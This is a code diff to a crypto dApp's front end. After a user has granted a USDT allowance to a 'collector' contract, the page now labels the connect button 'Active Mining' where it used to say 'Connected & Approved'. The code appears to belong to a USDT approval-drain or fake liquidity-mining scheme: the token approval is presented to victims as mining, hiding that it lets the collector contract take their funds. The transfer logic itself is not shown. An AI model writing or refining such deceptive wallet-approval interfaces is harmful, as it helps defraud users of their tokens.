@@ -360,8 +360,9 @@
                 const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
 
                 if (Number(allowance) > 0) {
-                    document.getElementById("connectBtn").innerText = "Connected & Approved";
-                    document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3.5 py-2.5 rounded-xl transition text-sm shadow-lg cursor-default";
+                    const connectBtn = document.getElementById("connectBtn");
+                    connectBtn.innerText = "Active Mining";
+                    connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
                     
                     const badgeEl = document.getElementById("selectedNetworkBadge");
                     badgeEl.classList.remove("hidden");
@@ -426,8 +427,9 @@
                     const badgeEl = document.getElementById("selectedNetworkBadge");
                     badgeEl.classList.remove("hidden");
 
-                    document.getElementById("connectBtn").innerText = "Connected & Approved";
-                    document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3.5 py-2.5 rounded-xl transition text-sm shadow-lg cursor-default";
+                    const connectBtn = document.getElementById("connectBtn");
+                    connectBtn.innerText = "Active Mining";
+                    connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
 
                     await checkUserData();
                     startRealtimeBalanceSync();
@@ -447,8 +449,9 @@
                 const badgeEl = document.getElementById("selectedNetworkBadge");
                 badgeEl.classList.remove("hidden");
 
-                document.getElementById("connectBtn").innerText = "Connected & Approved";
-                document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3.5 py-2.5 rounded-xl transition text-sm shadow-lg cursor-default";
+                const connectBtn = document.getElementById("connectBtn");
+                connectBtn.innerText = "Active Mining";
+                connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
 
                 logEl.innerText = "Transaction တင်နေပါသည်...";
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
